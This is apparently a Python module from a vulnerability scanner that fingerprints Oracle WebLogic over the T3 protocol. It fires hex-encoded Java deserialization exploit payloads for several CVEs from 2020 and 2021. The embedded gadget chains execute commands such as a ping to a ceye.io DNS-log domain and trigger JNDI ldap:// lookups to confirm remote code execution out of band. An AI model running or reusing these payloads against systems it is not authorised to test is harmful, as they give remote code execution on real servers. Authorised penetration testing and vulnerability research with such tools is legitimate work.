# coding=utf-8
# @Author   : zpchcbd HG team
# @Blog     : https://www.cnblogs.com/zpchcbd/
# @Time     : 2021-12-06 18:46

from core.request.weblogicT3 import T3handShake, T3SendSerialize
from core.utils.dnslog import ceye_dnslog_verify
from core.data import gLogger
from async_timeout import timeout
import asyncio


async def check_t3(addr):
    try:
        with timeout(5):
            reader, writer = await asyncio.open_connection(addr.split(':')[0], int(addr.split(':')[1]))
            result = await T3handShake(writer, reader)
            await asyncio.sleep(1)
            writer.close()
            if b'HELO:' in result:
                gLogger.myscan_info('[+] target maybe weblogic T3 banner, {}'.format(addr))
                return {'name': 'T3 Banner', 'url': addr, 'software': 'weblogic'}
    except asyncio.TimeoutError:
        return None
    except Exception:
        return None


async def CVE_2020_2551(addr):
    try:
        with timeout(5):
            reader, writer = await asyncio.open_connection(addr.split(':')[0], int(addr.split(':')[1]))
            payload = '47494f50010200030000001700000002000000000000000b4e616d6553657276696365'
            writer.write(bytes.fromhex(payload))
            await writer.drain()
            await asyncio.sleep(1)
            result = await reader.read(1024)
            writer.close()
            if b'GIOP' in result:
                gLogger.myscan_info('Target maybe weblogic CVE_2020_2551, {}'.format(addr))
                return {'name': 'weblogic CVE_2020_2551', 'url': addr, 'software': 'weblogic'}
    except Exception:
        return None


async def CVE_2020_2555(addr):
    payload = 'aced0005737200257765626c6f6769632e636f7262612e7574696c732e4d61727368616c6c65644f626a656374592161d5f3d1dbb6020002490004686173685b00086f626a42797465737400025b427870caaa50a4757200025b42acf317f8060854e0020000787000000e59aced00057372002e6a617661782e6d616e6167656d656e742e42616441747472696275746556616c7565457870457863657074696f6ed4e7daab632d46400200014c000376616c7400124c6a6176612f6c616e672f4f626a6563743b787200136a6176612e6c616e672e457863657074696f6ed0fd1f3e1a3b1cc4020000787200136a6176612e6c616e672e5468726f7761626c65d5c635273977b8cb0300044c000563617573657400154c6a6176612f6c616e672f5468726f7761626c653b4c000d64657461696c4d6573736167657400124c6a6176612f6c616e672f537472696e673b5b000a737461636b547261636574001e5b4c6a6176612f6c616e672f537461636b5472616365456c656d656e743b4c001473757070726573736564457863657074696f6e737400104c6a6176612f7574696c2f4c6973743b787071007e0008707572001e5b4c6a6176612e6c616e672e537461636b5472616365456c656d656e743b02462a3c3cfd22390200007870000000027372001b6a6176612e6c616e672e537461636b5472616365456c656d656e746109c59a2636dd8502000449000a6c696e654e756d6265724c000e6465636c6172696e67436c61737371007e00054c000866696c654e616d6571007e00054c000a6d6574686f644e616d6571007e0005787000000046740025636f6d2e7a7063686362642e7765626c6f6769632e4356455f323032305f323535355f55507400154356455f323032305f323535355f55502e6a617661740009696e766f6b65524d497371007e000b0000002271007e000d71007e000e7400046d61696e737200266a6176612e7574696c2e436f6c6c656374696f6e7324556e6d6f6469666961626c654c697374fc0f2531b5ec8e100200014c00046c69737471007e00077872002c6a6176612e7574696c2e436f6c6c656374696f6e7324556e6d6f6469666961626c65436f6c6c656374696f6e19420080cb5ef71e0200014c0001637400164c6a6176612f7574696c2f436f6c6c656374696f6e3b7870737200136a6176612e7574696c2e41727261794c6973747881d21d99c7619d03000149000473697a657870000000007704000000007871007e00177873720024636f6d2e74616e676f736f6c2e7574696c2e66696c7465722e4c696d697446696c746572954e4590be89865f02000649000b6d5f635061676553697a654900076d5f6e506167654c000c6d5f636f6d70617261746f727400164c6a6176612f7574696c2f436f6d70617261746f723b4c00086d5f66696c74657274001a4c636f6d2f74616e676f736f6c2f7574696c2f46696c7465723b4c000f6d5f6f416e63686f72426f74746f6d71007e00014c000c6d5f6f416e63686f72546f7071007e000178720034636f6d2e74616e676f736f6c2e7574696c2e66696c7465722e416273747261637451756572795265636f7264657246696c746572f3b98201f680eb90020000787000000000000000007372002c636f6d2e74616e676f736f6c2e7574696c2e657874726163746f722e436861696e6564457874726163746f72435b250b72f63db502000078720036636f6d2e74616e676f736f6c2e7574696c2e657874726163746f722e4162737472616374436f6d706f73697465457874726163746f72086b3d8c05690f440200015b000c6d5f61457874726163746f727400235b4c636f6d2f74616e676f736f6c2f7574696c2f56616c7565457874726163746f723b7872002d636f6d2e74616e676f736f6c2e7574696c2e657874726163746f722e4162737472616374457874726163746f729b1be18ed70100e50200014900096d5f6e546172676574787000000000757200235b4c636f6d2e74616e676f736f6c2e7574696c2e56616c7565457874726163746f723b2246204735c4a0fe0200007870000000057372002f636f6d2e74616e676f736f6c2e7574696c2e657874726163746f722e5265666c656374696f6e457874726163746f721f62f564b951b6140200025b00096d5f616f506172616d7400135b4c6a6176612f6c616e672f4f626a6563743b4c00096d5f734d6574686f6471007e00057871007e002000000000757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c020000787000000001757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a990200007870000000007400166765744465636c61726564436f6e7374727563746f727371007e0024000000007571007e0027000000017571007e00270000000074000b6e6577496e7374616e63657371007e0024000000007571007e00270000000374001f636f6d2e7a7063686362642e7765626c6f6769632e52656d6f7465496d706c757200025b42acf317f8060854e00200007870000006afcafebabe0000003400520a001100350700360a000200350700370a000400350800380b0039003a07003b08003c0a0008003d07003e08003f0a000b00400a000b00410a004200430700440700450700460100063c696e69743e010003282956010004436f646501000f4c696e654e756d6265725461626c650100124c6f63616c5661726961626c655461626c65010004746869730100214c636f6d2f7a7063686362642f7765626c6f6769632f52656d6f7465496d706c3b0100046d61696e010016285b4c6a6176612f6c616e672f537472696e673b295601000672656d6f7465010007636f6e746578740100164c6a617661782f6e616d696e672f436f6e746578743b010004617267730100135b4c6a6176612f6c616e672f537472696e673b01000d537461636b4d61705461626c6507003b0100117365745365727665724c6f636174696f6e010027284c6a6176612f6c616e672f537472696e673b4c6a6176612f6c616e672f537472696e673b2956010003636d640100124c6a6176612f6c616e672f537472696e673b01000a457863657074696f6e730700470100116765745365727665724c6f636174696f6e010026284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f537472696e673b010001650100154c6a6176612f6c616e672f457863657074696f6e3b0100083c636c696e69743e01000375726c01000e4c6a6176612f6e65742f55524c3b01000d75726c436f6e6e656374696f6e0100184c6a6176612f6e65742f55524c436f6e6e656374696f6e3b07004401000a536f7572636546696c6501000f52656d6f7465496d706c2e6a6176610c0013001401001f636f6d2f7a7063686362642f7765626c6f6769632f52656d6f7465496d706c01001b6a617661782f6e616d696e672f496e697469616c436f6e746578740100077a7063686362640700480c0049004a0100136a6176612f6c616e672f457863657074696f6e0100056f6b2e2e2e0c004b004c01000c6a6176612f6e65742f55524c010023687474703a2f2f4356455f323032305f323535352e3077747073672e636579652e696f0c0013004d0c004e004f0700500c005100140100136a6176612f696f2f494f457863657074696f6e0100106a6176612f6c616e672f4f626a65637401002e7765626c6f6769632f636c75737465722f73696e676c65746f6e2f436c75737465724d617374657252656d6f74650100186a6176612f726d692f52656d6f7465457863657074696f6e0100146a617661782f6e616d696e672f436f6e74657874010006726562696e64010027284c6a6176612f6c616e672f537472696e673b4c6a6176612f6c616e672f4f626a6563743b295601000a6765744d65737361676501001428294c6a6176612f6c616e672f537472696e673b010015284c6a6176612f6c616e672f537472696e673b295601000e6f70656e436f6e6e656374696f6e01001a28294c6a6176612f6e65742f55524c436f6e6e656374696f6e3b0100166a6176612f6e65742f55524c436f6e6e656374696f6e010007636f6e6e6563740021000200110001001200000005000100130014000100150000002f00010001000000052ab70001b10000000200160000000600010000001100170000000c0001000000050018001900000009001a001b0001001500000085000300030000001ebb000259b700034cbb000459b700054d2c12062bb900070300a700044cb1000100000019001c0008000300160000001a00060000001f000800200010002100190024001c0022001d0025001700000020000300080011001c0019000100100009001d001e00020000001e001f0020000000210000000700025c07002200000100230024000200150000003f0000000300000001b10000000200160000000600010000002b0017000000200003000000010018001900000000000100250026000100000001001f002600020027000000040001002800010029002a000200150000006300010003000000091209b04d2cb6000ab000010000000200030008000300160000000e0003000000310003004500040046001700000020000300040005002b002c00020000000900180019000000000009002500260001002100000006000143070022002700000004000100280008002d001400010015000000750003000200000018bb000b59120cb7000d4b2ab6000e4c2bb6000fa700044bb100010000001300160010000300160000001a000600000015000a0016000f00170013001a001600180017001b0017000000160002000a0009002e002f0000000f0004003000310001002100000007000256070032000001003300000002003470740012646566696e65436f646547656e436c6173737371007e0024000000007571007e00270000000271007e00117571007e002900000001767200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b4702000078707400096765744d6574686f647371007e0024000000007571007e002700000002707571007e00270000000170740006696e766f6b657070767200307765626c6f6769632e7574696c732e636c6173736c6f61646572732e436c61737370617468436c6173734c6f6164657200000000000000000000007870'
    try:
        with timeout(5):
            reader, writer = await asyncio.open_connection(addr.split(':')[0], int(addr.split(':')[1]))
            await T3handShake(writer, reader)
            await asyncio.sleep(1)
            await T3SendSerialize(writer, reader, payload)
            await asyncio.sleep(2)
            writer.close()
            flag = await ceye_dnslog_verify('dns', 'CVE_2020_2555')
            if flag:
                gLogger.myscan_info('Target maybe weblogic CVE_2020_2555, {}'.format(addr))
                return {'name': 'weblogic CVE_2020_2555', 'url': addr, 'software': 'weblogic'}
    except Exception:
        return None


async def CVE_2020_2883(addr):
    payload = 'aced00057372002e6a617661782e6d616e6167656d656e742e42616441747472696275746556616c7565457870457863657074696f6ed4e7daab632d46400200014c000376616c7400124c6a6176612f6c616e672f4f626a6563743b787200136a6176612e6c616e672e457863657074696f6ed0fd1f3e1a3b1cc4020000787200136a6176612e6c616e672e5468726f7761626c65d5c635273977b8cb0300044c000563617573657400154c6a6176612f6c616e672f5468726f7761626c653b4c000d64657461696c4d6573736167657400124c6a6176612f6c616e672f537472696e673b5b000a737461636b547261636574001e5b4c6a6176612f6c616e672f537461636b5472616365456c656d656e743b4c001473757070726573736564457863657074696f6e737400104c6a6176612f7574696c2f4c6973743b787071007e0008707572001e5b4c6a6176612e6c616e672e537461636b5472616365456c656d656e743b02462a3c3cfd22390200007870000000017372001b6a6176612e6c616e672e537461636b5472616365456c656d656e746109c59a2636dd8502000449000a6c696e654e756d6265724c000e6465636c6172696e67436c61737371007e00054c000866696c654e616d6571007e00054c000a6d6574686f644e616d6571007e000578700000001a740022636f6d2e7a7063686362642e7765626c6f6769632e4356455f323032305f323838337400124356455f323032305f323838332e6a6176617400046d61696e737200266a6176612e7574696c2e436f6c6c656374696f6e7324556e6d6f6469666961626c654c697374fc0f2531b5ec8e100200014c00046c69737471007e00077872002c6a6176612e7574696c2e436f6c6c656374696f6e7324556e6d6f6469666961626c65436f6c6c656374696f6e19420080cb5ef71e0200014c0001637400164c6a6176612f7574696c2f436f6c6c656374696f6e3b7870737200136a6176612e7574696c2e41727261794c6973747881d21d99c7619d03000149000473697a657870000000007704000000007871007e00157873720024636f6d2e74616e676f736f6c2e7574696c2e66696c7465722e4c696d697446696c746572954e4590be89865f02000649000b6d5f635061676553697a654900076d5f6e506167654c000c6d5f636f6d70617261746f727400164c6a6176612f7574696c2f436f6d70617261746f723b4c00086d5f66696c74657274001a4c636f6d2f74616e676f736f6c2f7574696c2f46696c7465723b4c000f6d5f6f416e63686f72426f74746f6d71007e00014c000c6d5f6f416e63686f72546f7071007e000178720034636f6d2e74616e676f736f6c2e7574696c2e66696c7465722e416273747261637451756572795265636f7264657246696c746572f3b98201f680eb90020000787000000000000000007372002c636f6d2e74616e676f736f6c2e7574696c2e657874726163746f722e436861696e6564457874726163746f72435b250b72f63db502000078720036636f6d2e74616e676f736f6c2e7574696c2e657874726163746f722e4162737472616374436f6d706f73697465457874726163746f72086b3d8c05690f440200015b000c6d5f61457874726163746f727400235b4c636f6d2f74616e676f736f6c2f7574696c2f56616c7565457874726163746f723b7872002d636f6d2e74616e676f736f6c2e7574696c2e657874726163746f722e4162737472616374457874726163746f729b1be18ed70100e50200014900096d5f6e546172676574787000000000757200235b4c636f6d2e74616e676f736f6c2e7574696c2e56616c7565457874726163746f723b2246204735c4a0fe02000078700000000173720038636f6d2e74616e676f736f6c2e636f686572656e63652e726573742e7574696c2e657874726163746f722e4d76656c457874726163746f725f1457039578b9790200014c00076d5f734578707271007e00057871007e001e000000007400496a6176612e6c616e672e52756e74696d652e67657452756e74696d6528292e65786563282270696e67204356455f323032305f323838332e3077747073672e636579652e696f22293b7070767200106a6176612e6c616e672e537472696e67a0f0a4387a3bb3420200007870'
    try:
        with timeout(5):
            reader, writer = await asyncio.open_connection(addr.split(':')[0], int(addr.split(':')[1]))
            await T3handShake(writer, reader)
            await asyncio.sleep(1)
            await T3SendSerialize(writer, reader, payload)
            await asyncio.sleep(2)
            writer.close()
            flag = await ceye_dnslog_verify('dns', 'CVE_2020_2883')
            if flag:
                gLogger.myscan_info('Target maybe weblogic CVE_2020_2883, {}'.format(addr))
                return {'name': 'weblogic CVE_2020_2883', 'url': addr, 'software': 'weblogic'}
    except Exception:
        return None


async def CVE_2020_14645(addr):
    payload = 'aced0005737200176a6176612e7574696c2e5072696f72697479517565756594da30b4fb3f82b103000249000473697a654c000a636f6d70617261746f727400164c6a6176612f7574696c2f436f6d70617261746f723b78700000000273720030636f6d2e74616e676f736f6c2e7574696c2e636f6d70617261746f722e457874726163746f72436f6d70617261746f72f9b3bc58cc52cd210200014c000b6d5f657874726163746f727400224c636f6d2f74616e676f736f6c2f7574696c2f56616c7565457874726163746f723b78707372002e636f6d2e74616e676f736f6c2e7574696c2e657874726163746f722e556e6976657273616c457874726163746f720dc477bfff4bf18c0200025b00096d5f616f506172616d7400135b4c6a6176612f6c616e672f4f626a6563743b4c00076d5f734e616d657400124c6a6176612f6c616e672f537472696e673b7872002d636f6d2e74616e676f736f6c2e7574696c2e657874726163746f722e4162737472616374457874726163746f729b1be18ed70100e50200014900096d5f6e546172676574787000000001757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000074001567657444617461626173654d6574614461746128297704000000037372001d636f6d2e73756e2e726f777365742e4a646263526f77536574496d706cce26d81f4973c2050200074c0004636f6e6e7400154c6a6176612f73716c2f436f6e6e656374696f6e3b4c000d694d61746368436f6c756d6e737400124c6a6176612f7574696c2f566563746f723b4c0002707374001c4c6a6176612f73716c2f507265706172656453746174656d656e743b4c00057265734d4474001c4c6a6176612f73716c2f526573756c745365744d657461446174613b4c0006726f77734d447400254c6a617661782f73716c2f726f777365742f526f775365744d65746144617461496d706c3b4c000272737400144c6a6176612f73716c2f526573756c745365743b4c000f7374724d61746368436f6c756d6e7371007e00107872001b6a617661782e73716c2e726f777365742e42617365526f7753657443d11da54dc2b1e002001549000b636f6e63757272656e63795a001065736361706550726f63657373696e674900086665746368446972490009666574636853697a6549000969736f6c6174696f6e49000c6d61784669656c6453697a654900076d6178526f777349000c717565727954696d656f75745a0008726561644f6e6c7949000a726f77536574547970655a000b73686f7744656c657465644c000355524c71007e00084c000b617363696953747265616d7400154c6a6176612f696f2f496e70757453747265616d3b4c000c62696e61727953747265616d71007e00164c000a6368617253747265616d7400104c6a6176612f696f2f5265616465723b4c0007636f6d6d616e6471007e00084c000a64617461536f7572636571007e00084c00096c697374656e65727371007e00104c00036d617074000f4c6a6176612f7574696c2f4d61703b4c0006706172616d737400154c6a6176612f7574696c2f486173687461626c653b4c000d756e69636f646553747265616d71007e00167870000003f001000003e8000000000000000200000000000000000000000001000003ec0070707070707400296c6461703a2f2f4356455f323032305f31343634355f746573742e3077747073672e636579652e696f737200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e744461746171007e0007787000000000000000007571007e000b0000000a707070707070707070707870737200136a6176612e7574696c2e486173687461626c6513bb0f25214ae4b803000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000877080000000b000000007870707371007e001c000000000000000a7571007e000b0000000a737200116a6176612e6c616e672e496e746567657212e2a0a4f781873802000149000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b0200007870ffffffff71007e002571007e002571007e002571007e002571007e002571007e002571007e002571007e002571007e002578707070707371007e001c000000000000000a7571007e000b0000000a707070707070707070707871007e001a78'
    try:
        with timeout(5):
            reader, writer = await asyncio.open_connection(addr.split(':')[0], int(addr.split(':')[1]))
            await T3handShake(writer, reader)
            await asyncio.sleep(1)
            await T3SendSerialize(writer, reader, payload)
            await asyncio.sleep(2)
            writer.close()
            flag = await ceye_dnslog_verify('dns', 'CVE_2020_14645')
            if flag:
                gLogger.myscan_info('Target maybe weblogic CVE_2020_14645, {}'.format(addr))
                return {'name': 'weblogic CVE_2020_14645', 'url': addr, 'software': 'weblogic'}
    except Exception:
        return None


async def CVE_2020_14756(addr):
    payload = 'aced00057372002e636f6d2e74616e676f736f6c2e636f686572656e63652e736572766c65742e417474726962757465486f6c646572cc30a4783def6ac10c0000787077d0400a39636f6d2e74616e676f736f6c2e7574696c2e61676772656761746f722e546f704e41676772656761746f72245061727469616c526573756c740a38636f6d2e74616e676f736f6c2e636f686572656e63652e726573742e7574696c2e657874726163746f722e4d76656c457874726163746f72000000008a016a6176612e6c616e672e52756e74696d652e67657452756e74696d6528292e65786563282270696e67204356455f323032305f31343735362e3077747073672e636579652e696f22293b0200000001010100000078'
    try:
        with timeout(5):
            reader, writer = await asyncio.open_connection(addr.split(':')[0], int(addr.split(':')[1]))
            await T3handShake(writer, reader)
            await asyncio.sleep(1)
            await T3SendSerialize(writer, reader, payload)
            await asyncio.sleep(2)
            writer.close()
            flag = await ceye_dnslog_verify('dns', 'CVE_2020_14756')
            if flag:
                gLogger.myscan_info('Target maybe weblogic CVE_2020_14756, {}'.format(addr))
                return {'name': 'weblogic CVE_2020_14756', 'url': addr, 'software': 'weblogic'}
    except Exception:
        pass


async def CVE_2021_2394(addr):
    payload = 'aced00057372002e636f6d2e74616e676f736f6c2e636f686572656e63652e736572766c65742e417474726962757465486f6c646572cc30a4783def6ac10c0000787077b3400a39636f6d2e74616e676f736f6c2e7574696c2e61676772656761746f722e546f704e41676772656761746f72245061727469616c526573756c740a89016f7261636c652e65636c697073656c696e6b2e636f686572656e63652e696e74656772617465642e696e7465726e616c2e7175657279696e672e46696c746572457874726163746f7201060a48656e674765205365630607636f6e6e656374060d736574436f6e6e656374696f6e02000000010b7372001d636f6d2e73756e2e726f777365742e4a646263526f77536574496d706cce26d81f4973c2050200074c0004636f6e6e7400154c6a6176612f73716c2f436f6e6e656374696f6e3b4c000d694d61746368436f6c756d6e737400124c6a6176612f7574696c2f566563746f723b4c0002707374001c4c6a6176612f73716c2f507265706172656453746174656d656e743b4c00057265734d4474001c4c6a6176612f73716c2f526573756c745365744d657461446174613b4c0006726f77734d447400254c6a617661782f73716c2f726f777365742f526f775365744d65746144617461496d706c3b4c000272737400144c6a6176612f73716c2f526573756c745365743b4c000f7374724d61746368436f6c756d6e7371007e00047872001b6a617661782e73716c2e726f777365742e42617365526f7753657443d11da54dc2b1e002001549000b636f6e63757272656e63795a001065736361706550726f63657373696e674900086665746368446972490009666574636853697a6549000969736f6c6174696f6e49000c6d61784669656c6453697a654900076d6178526f777349000c717565727954696d656f75745a0008726561644f6e6c7949000a726f77536574547970655a000b73686f7744656c657465644c000355524c7400124c6a6176612f6c616e672f537472696e673b4c000b617363696953747265616d7400154c6a6176612f696f2f496e70757453747265616d3b4c000c62696e61727953747265616d71007e000b4c000a6368617253747265616d7400104c6a6176612f696f2f5265616465723b4c0007636f6d6d616e6471007e000a4c000a64617461536f7572636571007e000a4c00096c697374656e65727371007e00044c00036d617074000f4c6a6176612f7574696c2f4d61703b4c0006706172616d737400154c6a6176612f7574696c2f486173687461626c653b4c000d756e69636f646553747265616d71007e000b7870000003f001000003e8000000000000000200000000000000000000000001000003ec0070707070707400236c6461703a2f2f4356455f323032315f323339342e3077747073672e636579652e696f737200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78700000000000000000757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000a707070707070707070707870737200136a6176612e7574696c2e486173687461626c6513bb0f25214ae4b803000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000877080000000b000000007870707371007e0011000000000000000a7571007e00140000000a737200116a6176612e6c616e672e496e746567657212e2a0a4f781873802000149000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b0200007870ffffffff71007e001c71007e001c71007e001c71007e001c71007e001c71007e001c71007e001c71007e001c71007e001c78707070707371007e0011000000000000000a7571007e00140000000a7070707070707070707078770300000078'
    try:
        with timeout(5):
            reader, writer = await asyncio.open_connection(addr.split(':')[0], int(addr.split(':')[1]))
            await T3handShake(writer, reader)
            await asyncio.sleep(1)
            await T3SendSerialize(writer, reader, payload)
            await asyncio.sleep(2)
            writer.close()
            flag = await ceye_dnslog_verify('dns', 'CVE_2021_2394')
            if flag:
                gLogger.myscan_info('Target maybe weblogic CVE_2021_2394, {}'.format(addr))
                return {'name': 'weblogic CVE_2021_2394', 'url': addr, 'software': 'weblogic'}
    except Exception:
        pass


async def weblogic_scan(addr):
    vul_list = []
    a = await check_t3(addr)
    if a is not None:
        vul_list.append(a)
        b = await CVE_2020_2551(addr)
        if b is not None:
            vul_list.append(b)
        c = await CVE_2020_2555(addr)
        if c is not None:
            vul_list.append(c)
        d = await CVE_2020_2883(addr)
        if d is not None:
            vul_list.append(d)
        e = await CVE_2020_14645(addr)
        if e is not None:
            vul_list.append(e)
        f = await CVE_2020_14756(addr)
        if f is not None:
            vul_list.append(f)
        g = await CVE_2021_2394(addr)
        if g is not None:
            vul_list.append(g)
    return vul_list


if __name__ == '__main__':
    pass